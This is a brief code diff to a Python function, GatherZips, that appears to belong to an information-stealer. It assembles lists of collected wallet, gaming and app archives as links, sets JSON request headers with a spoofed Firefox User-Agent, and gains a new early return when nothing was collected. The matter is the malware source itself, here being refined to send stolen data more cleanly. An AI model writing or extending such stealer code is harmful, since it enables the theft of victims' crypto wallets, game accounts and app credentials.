@@ -2106,6 +2106,8 @@ def GatherZips(paths1, paths2, paths3):
             otth = ":tickets:  •  Apps\n"
             for i in OtherZip:
                 otth += f"└─ [{i[0]}]({i[1]})\n"
+        if len(wltZip) == len(GamingZip) == len(OtherZip) == 0:
+            return
         headers = {
             "Content-Type": "application/json",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
